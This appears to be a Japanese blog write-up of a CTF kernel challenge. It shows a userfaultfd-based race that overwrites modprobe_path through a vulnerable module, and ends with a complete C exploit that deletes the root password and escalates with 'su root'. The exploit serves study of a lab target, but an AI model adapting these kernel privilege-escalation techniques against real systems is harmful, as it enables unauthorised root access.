+++
date = 2026-05-03
title = "TimeOfControl Upsolve"
[taxonomies]
tags = ["CTF"]
+++

## これは何
昔SECCON Beginners CTF 2025のTimeOfControl以外のwriteup/upsolveを出したのですが、今回はそれの続きです。最近Kernel Exploitに入門する機会が合ったため、復習のためにも解いてみました。

## TimeOfControl
`run.sh`よりKASLR及びPTIがオフであると分かる。
とりあえずデバッグしたいので、`etc/init.d/S99ctf`に変更を加えた(これは後で戻す)
- `dmesg_restrict`を0に変更
- `kptr_restrict`を0に変更
- rootでログインに変更
### 攻撃の方針
1. race-conditionを利用して`is_offset_valid`のチェックが通った後に、`msg_offset`を改ざんする。
2. `msg_offset`を不正な値にすることでAAWを獲得し、`modprobe_path`などを上書きして権限昇格。
3. OSはシングルコアで動作していることがわかるため、別スレッドではなく`userfaultfd`を利用。

### modprobe_pathを探す
```python
#!/usr/bin/env python3
from pwn import *

kernel = ELF("../src/vmlinux")
test = hex(next(kernel.search("/sbin/modprobe\x00")))
print(f"address of modprobe_path: {test}")
```

```
address of modprobe_path: 0xffffffff820ade80

gef> x/s 0xffffffff820ade80
0xffffffff820ade80:	"/sbin/modprobe"
```

### global_msgを探す
モジュールの大域変数はどこにあるのか。`vmmap`で見ると下の方に`modules`の`rw`な領域がある。
```
0xffffffff81000000-0xffffffff81c00000 0x0000000000c00000 [r-x] kernel .text
0xffffffff81c00000-0xffffffff81e00000 0x0000000000200000 [r--] maybe kernel .rodata
0xffffffff81e00000-0xffffffff81eb5000 0x00000000000b5000 [r--]
0xffffffff81eb5000-0xffffffff82000000 0x000000000014b000 [rw-] maybe kernel .data
0xffffffff82000000-0xffffffff82004000 0x0000000000004000 [rw-] kstack PID:0 (swapper/0)
0xffffffff82004000-0xffffffff822d0000 0x00000000002cc000 [rw-]
0xffffffff822d0000-0xffffffff822d1000 0x0000000000001000 [r--]
0xffffffff822d1000-0xffffffff82600000 0x000000000032f000 [rw-]
0xffffffffc0000000-0xffffffffc0001000 0x0000000000001000 [r-x] modules, kernel module (ctf4b)
0xffffffffc0002000-0xffffffffc0004000 0x0000000000002000 [rw-] modules
0xffffffffc0005000-0xffffffffc0006000 0x0000000000001000 [r--] modules
0xffffffffff5fc000-0xffffffffff5fe000 0x0000000000002000 [rw-] fixmap
```

ここを`tel`してみると下の方に文字列があった。つまり`0xffffffffc0002160`が`global_msg`のアドレスであるとわかる。
```
0xffffffffc0002160|+0x0160|+044: 0x50206c656e72654b 'Kernel Pwn is fun!'
0xffffffffc0002168|+0x0168|+045: 0x7566207369206e77 'wn is fun!'
0xffffffffc0002170|+0x0170|+046: 0x000000000000216e ('n!'?)
```
おそらくGhidraとかで文字列を探せばよかった気もする。(KASLRオフだし)

### Exploitの方針
情報が揃ったためExploitを作成する。流れは以下になる。
1. `mmap`で`0x1000`の領域を確保し、userfaultfdに登録する
2. その領域を`ioctl(fd, CTF4b_IOCTL_WRITE, page)`でモジュールに渡し、アクセスを誘発してページフォルトを発生させる
3. PF後、ハンドラでは以下2つを行う
	1. `ioctl(fd, CTF4b_IOCTL_SEEK, offset)`で`global_msg`から`modprobe_path`へのoffsetを設定する
	2. `struct ctf4b_request`の`buf`に`modprobe_path`に書き込みたいファイルパスを書き込み、ページの先頭に書き込んで返す
4. `modprobe_path`が書き換わったので、これを悪用する
	1. `/tmp/exploit, /tmp/invalid_magic`を作成
	2. 前者には`passwd -d root`でrootのパスワードを削除しておく。これによって権限昇格時にパスワードを不要にする。
	3. 後者には意味のないマジックナンバーを書き込む
	4. 最後に後者を実行し、追加で`su root`も実行しておく。

### 注意点
ページフォルトを起こすマッピング領域を`ioctl(fd, CTF4b_IOCTL_WRITE, page)`で渡していることに注意したい。実は私は最初、`page`ではなく`page`を`struct ctf4b_resquest`にラップして渡していたため、ハンドラでは`ctf4b_request`のメンバである`buf`をページに書き込んで返す必要があったのだが、ハンドラでも構造体を返していたため動かなかった。これで1時間はハマった。

### Exploit
Exploitの全体は以下。
```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/stat.h>

#include "../src/ctf4b.h"

#define PAGE_SIZE 0x1000
int fd = 0;

static void *userfaultfd_handler(void *arg) {
  static struct uffd_msg msg;
  struct uffdio_copy copy;

  long uffd = (long)arg;
  void *dummy_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(dummy_page != MAP_FAILED);

  struct pollfd pollfd = {
      .fd = uffd,
      .events = POLLIN,
  };

  printf("\t[handler] waiting for page fault...\n");
  while (poll(&pollfd, 1, -1) > 0) {
    assert((pollfd.revents & POLLERR || pollfd.revents & POLLHUP) == false);
    assert(read(uffd, &msg, sizeof(msg)) > 0);
    assert(msg.event == UFFD_EVENT_PAGEFAULT);

    printf("\t[handler] pagefault occured\n");

    /*
     * この時点で is_offset_validを通過後である
     * よってmsg_offsetをCTF4b_IOCTL_SEEKで、modprobe_pathまでのoffsetに変更する
     * offset = addr_modprobe_path - addr_global_msg
     */
    ioctl(fd, CTF4b_IOCTL_SEEK, 0xffffffff820ade80 - 0xffffffffc0002160);

    /*
     * 加えて、ここでmodprobe_pathに書き込みたい内容を準備する
     */
    char *path = "/tmp/exploit\x00";
    struct ctf4b_request req = {
        .buf = path,
        .size = strlen(path) + 1,
    };
    memcpy(dummy_page, &req, sizeof(struct ctf4b_request));

    copy.src = (unsigned long)dummy_page;
    copy.dst = (unsigned long)msg.arg.pagefault.address & ~0xfff;
    copy.len = PAGE_SIZE;
    copy.mode = 0;
    copy.copy = 0;

    printf("\t[handler] overwrite modprobe_path\n");
    assert(ioctl(uffd, UFFDIO_COPY, &copy) != -1);
  }
  return NULL;
}

void register_userfaultfd(void *addr, size_t len) {
  long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  assert(uffd != -1);

  struct uffdio_api uffdio_api = {
      .api = UFFD_API,
      .features = 0,
  };
  assert(ioctl(uffd, UFFDIO_API, &uffdio_api) >= 0);

  struct uffdio_register uffdio_register = {
      .range.start = (unsigned long)addr,
      .range.len = len,
      .mode = UFFDIO_REGISTER_MODE_MISSING,
  };
  assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);

  pthread_t th;
  assert(pthread_create(&th, NULL, userfaultfd_handler, (void *)uffd) == 0);
}

int main() {
  fd = open("/dev/ctf4b", O_RDWR);
  assert(fd != -1);

  // userfaultfdに利用する領域。1度だけハンドラを実行するので0x1000で良い
  void *page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(page != MAP_FAILED);

  // userfaultfdに領域を登録する
  printf("[main] setup userfaultfd to recv pagefault\n");
  register_userfaultfd(page, PAGE_SIZE);

  // pageをそのまま渡す
  // CTF4b_IOCTL_WRITEにおける最初のcopy_from_userで止める
  // これはstruct ctf4b_requestに対するアクセスになる
  // つまりハンドラではstruct ctf4b_requestを返す必要がある
  printf("[main] execute CTF4b_IOCTL_WRITE to trigger page fault\n");
  ioctl(fd, CTF4b_IOCTL_WRITE, page);

  /*
   * /tmp/exploit
   * マジックナンバーが不明な実行ファイルが実行された際に、実行されるファイル
   * passwd -d rootでrootのパスワードを削除する
   * この状態でsurootするとパスワード不要で権限昇格可能
   *
   * /tmp/invalid_magic
   * マジックナンバーが不明な実行ファイル
   * /tmp/exploitを起爆するためだけのファイル
   */
  system("echo -e '#!/bin/sh\npasswd -d root\n' > /tmp/exploit");
  system("chmod +x /tmp/exploit");

  system("echo -e '\xde\xad\xbe\xaf' > /tmp/invalid_magic");
  system("chmod +x /tmp/invalid_magic");

  system("/tmp/invalid_magic");
  system("/bin/sh -c \"su root\"");

  close(fd);

  return 0;
}

```
